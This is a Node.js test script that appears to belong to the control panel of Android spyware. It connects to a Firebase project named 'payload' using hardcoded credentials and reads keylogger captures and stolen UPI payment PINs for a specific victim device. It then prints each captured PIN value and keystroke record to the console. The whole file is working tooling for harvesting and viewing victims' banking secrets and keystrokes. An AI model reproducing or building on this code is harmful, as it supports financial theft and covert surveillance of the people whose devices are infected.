// Test script to verify data loading functions work correctly
import { initializeApp } from "firebase/app";
import { getDatabase, ref, get } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDAXJOpQaY6auUc9xBV3EwWeMaqG4FJ9Xk",
  authDomain: "payload-fea30.firebaseapp.com",
  databaseURL: "https://payload-fea30-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "payload-fea30",
  storageBucket: "payload-fea30.firebasestorage.app",
  messagingSenderId: "548911851830",
  appId: "1:548911851830:web:db0eb8754598876037eb97"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Test the exact paths that the React app is using
async function testDataLoading() {
  try {
    console.log('🧪 Testing data loading for React app...\n');
    
    const deviceId = 'Xiaomi 23076PC4BI';
    
    // Test KeyLogs path (note: lowercase 'l')
    console.log('📊 Testing KeyLogs path...');
    const keyLogsSnapshot = await get(ref(database, `Keylogs/${deviceId}`));
    const keyLogs = keyLogsSnapshot.val();
    console.log('✅ KeyLogs data:', keyLogs);
    console.log('📊 Number of logs:', keyLogs ? Object.keys(keyLogs).length : 0);
    
    // Test UPI Pins path
    console.log('\n💳 Testing UPI Pins path...');
    const upiPinsSnapshot = await get(ref(database, `UPIPins/${deviceId}`));
    const upiPins = upiPinsSnapshot.val();
    console.log('✅ UPI Pins data:', upiPins);
    console.log('💳 Number of pins:', upiPins ? Object.keys(upiPins).length : 0);
    
    // Test data structure
    if (keyLogs) {
      console.log('\n📋 KeyLogs structure analysis:');
      Object.entries(keyLogs).forEach(([logId, logData]) => {
        console.log(`  Log ${logId}:`);
        console.log(`    - Has Column1: ${!!logData.Column1}`);
        console.log(`    - Has Column2: ${!!logData.Column2}`);
        console.log(`    - Has Column3: ${!!logData.Column3}`);
        console.log(`    - Has Column4: ${!!logData.Column4}`);
        console.log(`    - Has Column5: ${!!logData.Column5}`);
        console.log(`    - Has Column6: ${!!logData.Column6}`);
        console.log(`    - Has timestamp: ${!!logData.timestamp}`);
        console.log(`    - Sample data: ${logData.Column1}, ${logData.Column2}, ${logData.Column3}`);
      });
    }
    
    if (upiPins) {
      console.log('\n🔐 UPI Pins structure analysis:');
      Object.entries(upiPins).forEach(([pinId, pinData]) => {
        console.log(`  Pin ${pinId}:`);
        console.log(`    - Has pin: ${!!pinData.pin}`);
        console.log(`    - Has timestamp: ${!!pinData.timestamp}`);
        console.log(`    - Pin value: ${pinData.pin}`);
        console.log(`    - Timestamp: ${pinData.timestamp}`);
      });
    }
    
    console.log('\n🎉 Data loading test completed!');
    
  } catch (error) {
    console.error('❌ Error during testing:', error);
  }
}

// Run the test
testDataLoading().then(() => {
  console.log('\n✅ Test completed successfully!');
  process.exit(0);
}).catch((error) => {
  console.error('❌ Test failed:', error);
  process.exit(1);
});
